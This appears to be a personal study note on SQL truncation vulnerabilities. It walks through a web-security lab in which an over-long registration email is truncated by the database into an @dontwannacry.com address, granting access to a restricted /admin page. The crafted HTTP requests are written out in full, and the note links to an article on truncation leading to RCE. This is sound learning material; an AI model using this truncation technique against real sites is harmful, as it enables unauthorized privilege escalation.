>[!summary]
>SQL truncation vulnerabilities occurs when the client, the server and the DBMS do not check consistently the length of user supplied input, resulting in the truncated storage of user input in the db caused by the laxed control of length by the server.

## Attack scenario

>[!info]
>A `/admin` endpoint exists but it's only accessible to users registered with the `@dontwannacry.com` email.

Registered a very long email:

```http
POST /register HTTP/1.1
Host: 0ad900c0033fdf32c106126b00ca004e.web-security-academy.net
Cookie: session=DHhTkd6GdW1WG2iHWcOKYTJr0BxrtZ0k
Content-Length: 148
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close

csrf=ecMNuZwDTSwGRsTGYvax1gXj8eiUugs7&username=user1&email=attacker%40aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.exploit-0a1800410308dfc1c12711a401170067.exploit-server.net&password=user1
```

Email has been truncated inside the db:

![](zzz_res/attachments/SQL-truncation1.png)
>[!note]-
>Email length is 255

Generated a very long email address that once truncated resulted in a different domain email:
attacker@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbb.dontwannacry.com.exploit-0a1800410308dfc1c12711a401170067.exploit-server.net

Truncated result (255 lenght):
attacker@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbb.dontwannacry.com

```http
POST /register HTTP/1.1
Host: 0ad900c0033fdf32c106126b00ca004e.web-security-academy.net
Cookie: session=5WIV520lP76FYcL229hV4EhNJCWAOUbc
Content-Length: 389
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close

csrf=hthHgzrgwAoViTeeWlwYBUF3Uwbkcsdk&username=user2&email=attacker@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbb.dontwannacry.com.exploit-0a1800410308dfc1c12711a401170067.exploit-server.net&password=user2
```

![](zzz_res/attachments/SQL-truncation2.png)

Accessed the restricted area:

![](zzz_res/attachments/SQL-truncation3.png)

## SQL Truncation in file upload leading to RCE

Article: [RCE in admin panel via File Write](https://medium.com/@knownsec404team/the-analysis-of-mybb-18-20-from-stored-xss-to-rce-7234d7cc0e72#:~:text=generates%20the%20tag.-,RCE%20in%20Admin%20panel%20via%20File%20Write,-In%20the%20backend)